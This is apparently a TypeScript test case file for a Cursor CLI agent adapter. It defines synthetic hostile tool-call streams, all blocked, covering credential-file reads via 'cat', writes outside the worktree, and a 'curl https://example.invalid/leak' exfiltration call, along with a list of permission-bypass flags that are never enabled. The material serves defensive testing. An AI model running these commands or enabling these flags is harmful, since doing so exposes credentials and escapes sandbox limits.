/**
 * Cursor case file for the per-adapter malicious leg (T4.46, T4.3; NFR-SEC-03, FR-POL-04, FR-POL-06).
 * Streams are SYNTHETIC, in the event shapes of the adapter's existing synthetic fixtures
 * (`src/adapters/cursor/fixtures/permission_denied.jsonl`, `success_edit.jsonl`; shapes recorded from the
 * 2026-10-14 live check, Cursor CLI 2026.10.12-d47ca18). They are not recordings of a real Cursor run.
 *
 * Compiles the one scope Cursor supports: an approved privileged bypass scope (Q-65, Q-79).
 * Repository MCP definitions stay unapproved because `--approve-mcps` is never enabled (FR-POL-04).
 */
import { CursorAdapter } from "../../../src/adapters/cursor/adapter.js";
import { BYPASS_SCOPE, PRIVILEGED_BYPASS_PROFILE } from "../../../src/adapters/cursor/fixtures/cases.js";
import { privilegedProfile } from "../../../src/adapters/fixtures/privileged.js";
import { replayLauncher } from "../../../src/adapters/fixtures/replay.js";
import type { ResolvedProfile } from "../../../src/adapters/types.js";
import type { AdapterLegCase, HostileStream } from "../adapter-leg.js";
import type { MaliciousFixture } from "../fixture.js";

const SID = "synthetic-cursor-session-malicious";
const META = (what: string, exit = 0) =>
  JSON.stringify({
    _fixture: {
      synthetic: true,
      note: `SYNTHETIC: hand-written for Cursor malicious leg tests (T4.46); no secrets. ${what}`,
      exit,
    },
  });

const INIT = JSON.stringify({
  type: "system",
  subtype: "init",
  session_id: SID,
  model: "synthetic-model",
  cwd: ".",
  permissionMode: "default",
  apiKeySource: "login",
});

const readCall = (id: string, path: string) => [
  JSON.stringify({
    type: "tool_call",
    subtype: "started",
    call_id: id,
    session_id: SID,
    tool_call: { readToolCall: { args: { path } } },
  }),
  JSON.stringify({
    type: "tool_call",
    subtype: "completed",
    call_id: id,
    session_id: SID,
    tool_call: {
      readToolCall: {
        args: { path },
        result: { permissionDenied: { path, reason: "read blocked (synthetic)" } },
      },
    },
  }),
];

const editCall = (id: string, path: string) => [
  JSON.stringify({
    type: "tool_call",
    subtype: "started",
    call_id: id,
    session_id: SID,
    tool_call: { editToolCall: { args: { path } } },
  }),
  JSON.stringify({
    type: "tool_call",
    subtype: "completed",
    call_id: id,
    session_id: SID,
    tool_call: {
      editToolCall: {
        args: { path },
        result: { rejected: { path, reason: "write blocked (synthetic)" } },
      },
    },
  }),
];

const shellCall = (id: string, command: string) => [
  JSON.stringify({
    type: "tool_call",
    subtype: "started",
    call_id: id,
    session_id: SID,
    tool_call: { shellToolCall: { args: { command } } },
  }),
  JSON.stringify({
    type: "tool_call",
    subtype: "completed",
    call_id: id,
    session_id: SID,
    tool_call: {
      shellToolCall: {
        args: { command },
        result: { rejected: { command, reason: "permission denied (synthetic)", isReadonly: false } },
      },
    },
  }),
];

const RESULT_SUCCESS = JSON.stringify({
  type: "result",
  subtype: "success",
  is_error: false,
  result: "Command was not approved.",
  session_id: SID,
});

const RESULT_ERROR = JSON.stringify({
  type: "result",
  subtype: "error",
  is_error: true,
  result: "Command execution failed.",
  session_id: SID,
});

const NON_DISABLED_REPO_CONFIG: ResolvedProfile = privilegedProfile({
  ...BYPASS_SCOPE,
  repository_config: { mode: "approved" },
});

const cursorCase: AdapterLegCase = {
  provider: "cursor",
  profile: PRIVILEGED_BYPASS_PROFILE,
  bypassApproved: true,
  nonDisabledRepoConfig: NON_DISABLED_REPO_CONFIG,
  isolationFlags: ["--print", "--output-format"],
  // Never emitted by the adapter (FR-POL-03, FR-POL-04, FR-POL-06, TDD §4.5):
  // --approve-mcps would approve repository MCP definitions (.mcp.json);
  // other flags would bypass permissions, disable sandbox or load foreign directories.
  neverEnabledFlags: [
    "--approve-mcps",
    "--yolo",
    "--auto-review",
    "-w",
    "--worktree",
    "--workspace",
    "--add-dir",
    "--plugin-dir",
    "--continue",
    "--sandbox",
  ],
  makeAdapter: (file, exitCode) =>
    new CursorAdapter({
      executable: process.execPath,
      launcherArgs: replayLauncher("cursor", file, ["--exit-code", String(exitCode)]),
      timeouts: { wallClockMs: 10_000, idleMs: 2_000, killGraceMs: 300 },
    }),
  streams: (fx) => [
    {
      name: "read of a credential path, exit 1",
      category: "credential_read",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [META("credential read", 1), INIT, ...readCall("matrix-read", fx.codexAuthPath), RESULT_ERROR],
    },
    {
      name: "write outside the worktree, exit 1",
      category: "out_of_worktree_write",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [META("outside write", 1), INIT, ...editCall("matrix-write", fx.outsideSentinel), RESULT_ERROR],
    },
    {
      name: "shell write outside the worktree, exit 1",
      category: "out_of_worktree_write",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell outside write", 1),
        INIT,
        ...shellCall("matrix-shell-write", `touch ${fx.outsideSentinel}`),
        RESULT_ERROR,
      ],
    },
    {
      name: "shell network call, exit 1",
      category: "network",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("network", 1),
        INIT,
        ...shellCall("matrix-network", "curl https://example.invalid/leak"),
        RESULT_ERROR,
      ],
    },
    {
      name: "read of a credential path",
      category: "credential_read",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [META("read of a credential path", 0), INIT, ...readCall("c1", fx.claudeCredentialsPath), RESULT_SUCCESS],
    },
    {
      name: "shell read of a credential path",
      category: "credential_read",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell read of a credential path", 0),
        INIT,
        ...shellCall("c2", `cat ${fx.codexAuthPath}`),
        RESULT_SUCCESS,
      ],
    },
    {
      name: "shell read of a credential path, exit 1",
      category: "credential_read",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell read of a credential path, exit 1", 1),
        INIT,
        ...shellCall("c3", `cat ${fx.codexAuthPath}`),
        RESULT_ERROR,
      ],
    },
    {
      name: "write outside the worktree",
      category: "out_of_worktree_write",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [META("write outside the worktree", 0), INIT, ...editCall("c4", fx.outsideSentinel), RESULT_SUCCESS],
    },
    {
      name: "shell write outside the worktree",
      category: "out_of_worktree_write",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell write outside the worktree", 0),
        INIT,
        ...shellCall("c5", `touch ${fx.outsideSentinel}`),
        RESULT_SUCCESS,
      ],
    },
    {
      name: "shell network call",
      category: "network",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell network call", 0),
        INIT,
        ...shellCall("c6", "curl https://example.invalid/leak"),
        RESULT_SUCCESS,
      ],
    },
    {
      name: "only unknown event kinds, exit 1",
      category: "unknown_events",
      exitCode: 1,
      failureCode: "TOOL_FAILURE",
      lines: [
        META("Invented event type, non-zero exit", 1),
        JSON.stringify({ type: "synthetic_unknown_kind", session_id: SID }),
      ],
    },
    {
      name: "only unknown event kinds, clean exit",
      category: "unknown_events",
      exitCode: 0,
      failureCode: "OUTPUT_PROTOCOL_ERROR",
      lines: [
        META("Event types below are invented; the adapter must report them unknown.", 0),
        JSON.stringify({ type: "synthetic_unknown_kind", session_id: SID }),
        JSON.stringify({ type: "synthetic_another_unknown", session_id: SID }),
      ],
    },
  ],
};

export default cursorCase;

/** Synthetic malformed JSONL before and after each readable hostile call; no real provider is run. */
export const cursorPartialStreams = (fx: MaliciousFixture): HostileStream[] =>
  (["credential_read", "out_of_worktree_write", "network"] as const).flatMap((category) => {
    const call =
      category === "credential_read"
        ? readCall("partial-read", fx.claudeCredentialsPath)
        : category === "out_of_worktree_write"
          ? editCall("partial-write", fx.outsideSentinel)
          : shellCall("partial-network", "curl https://example.invalid/leak");
    return [0, 1].flatMap((exitCode) =>
      (["before", "after"] as const).map(
        (position): HostileStream => ({
          name: `output cut ${position} ${category}, exit ${exitCode}`,
          category,
          exitCode,
          failureCode: "OUTPUT_PROTOCOL_ERROR",
          lines: [
            META(`output cut ${position} ${category}`, exitCode),
            INIT,
            ...(position === "before" ? ['{"type":"tool_'] : []),
            ...call,
            ...(position === "after" ? ['{"type":"result","subtype":'] : [RESULT_SUCCESS]),
          ],
        }),
      ),
    );
  });
